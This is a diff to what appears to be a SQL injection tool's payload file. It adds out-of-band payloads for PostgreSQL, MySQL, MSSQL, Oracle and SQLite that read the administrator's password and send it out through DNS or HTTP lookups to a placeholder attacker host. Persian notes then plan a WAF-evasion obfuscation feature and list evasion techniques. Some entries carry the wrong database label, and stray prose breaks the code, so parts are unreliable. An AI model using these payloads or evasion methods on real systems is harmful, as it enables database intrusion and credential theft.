@@ -116,6 +116,91 @@ INTRUDER_SUBSTRING_RAW = {
     "SQLite": "';SELECT CASE WHEN ((SELECT SUBSTR(password,{position},1) FROM users WHERE username='administrator')='{char}') THEN LENGTH(randomblob(50000000)) ELSE 0 END--"
 }
 
+###### OAST ######
+
+
+oast = {
+    "PostgreSQL": """'; CREATE EXTENSION IF NOT EXISTS dblink; SELECT dblink_connect('host='||(SELECT encode(password::bytea,'hex') FROM users WHERE username='admin')||'.{DNS} user=test dbname=test');--""",
+    "PortgreSQL_dblink": """'; COPY (SELECT '') TO PROGRAM 'nslookup $(SELECT encode(password::bytea,''hex'')).{DNS}'--""",
+    "MySQL": """'; DECLARE @p VARCHAR(255); SET @p=(SELECT password FROM users WHERE username='admin'); EXEC('master..xp_dirtree ''\'+@p+'.{DNS}\a''')--""",
+    "MySQL_time_based": """'; IF (SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'a%')=1 WAITFOR DELAY '0:0:5'--""",
+    "MSSQL": """' UNION SELECT LOAD_FILE(CONCAT('\\',(SELECT HEX(password) FROM users WHERE username='admin'),'.{DNS}\a'))--""",
+    "MSSQL_time_based": """' UNION SELECT 1 INTO OUTFILE '\\{DNS}\a' LINES TERMINATED BY (SELECT password FROM users WHERE username='admin')--""",
+    "Oracle": """' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{DNS}/"> %remote;]>'),'/l') FROM dual--""",
+    "Oracle_DNS": """' UNION SELECT UTL_INADDR.get_host_address('{DNS}') FROM dual--""",
+    "SQLite": """' UNION SELECT 1 WHERE load_extension('\{DNS}\a')--"""
+}
+
+اول از همه یک لیست از تمام مواردی که باعث میشه در waf به مشکل بخوریم بده و همه دیتا بیس ها رو در نظر بگیر
+
+بعد میخوام که ابزارم ازم بپرسه که چه مدل دیتا بیسی رو میخوام Obfuscation کنم
+چون مدل Obfuscation کردن در هر دیتابیس فرق میکنه
+
+Case change
+Inline comments
+Hex / Char encoding
+Unicode / XML entities
+String concatenation
+Extra parentheses / operators
+Alternative keywords
+Whitespace tricks
+
+oast_pay = {
+    "Oracle": """' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.{DNS}/"> %remote;]>'),'/l') FROM dual--""",
+    "MSSQL": """'; DECLARE @d NVARCHAR(4000); SET @d = (SELECT password FROM users WHERE username='administrator'); EXEC('master..xp_dirtree ''\'+@d+'.{DNS}\a''')--""",
+    "MySQL": """' UNION SELECT LOAD_FILE(CONCAT('\\',(SELECT password FROM users WHERE username='administrator' LIMIT 1),'.{DNS}\a'))--""",
+    "PostgreSQL": """""",
+    "SQLite": """' UNION SELECT load_extension('\\'||(SELECT hex(password) FROM users WHERE username='administrator')||'.{DNS}\a')--"""
+}
+
+
+1. Microsoft SQL Server (MSSQL)
+
+'; exec master..xp_dirtree '\{oast}\a'--
+
+'; DECLARE @p VARCHAR(255);
+SET @p = (SELECT password FROM users WHERE username='Administrator');
+EXEC('master..xp_dirtree ''\' + @p + '.{oast}\a''')--
+
+HEX:
+'; DECLARE @p VARCHAR(255); SET @p = (SELECT sys.fn_varbintohexstr(CONVERT(VARBINARY(255), password)) FROM users WHERE username='Administrator'); EXEC('master..xp_dirtree ''\' + @p + '.{oast}\a''')--
+
+
+2. Oracle
+
+' UNION SELECT UTL_INADDR.get_host_address('{oast}') FROM dual--
+
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='admin')||'.{oast}/"> %remote; ]>'),'/l') FROM dual--
+
+' UNION SELECT UTL_HTTP.REQUEST('http://'||(SELECT password FROM users)||'.{oast}/') FROM dual--
+
+
+3. MySQL
+
+' UNION SELECT LOAD_FILE(CONCAT('\\', '{oast}', '\a'))--
+
+' UNION SELECT LOAD_FILE(CONCAT('\\', (SELECT HEX(password) FROM users WHERE username='admin'), '.{oast}', '\a'))--
+
+
+4. PostgreSQL
+
+'; COPY (SELECT '') TO '\{oast}\a'--
+
+
+5. SQLite 
+
+' UNION SELECT load_extension('\\{oast}\a')--
+
+
+
+MSSQL	        xp_dirtree + UNC Path	    هگز + xp_dirtree
+Oracle	        UTL_INADDR یا XXE	        XXE یا UTL_HTTP
+MySQL	        LOAD_FILE (ویندوز)	        هگز + LOAD_FILE
+PostgreSQL	    COPY (ویندوز)	            dblink یا COPY با هگز
+SQLite	        load_extension (غیرمعمول)	نیاز به پیکربندی سفارشی
+
+
+
 
 
 ime_fingerprints_confirm = {
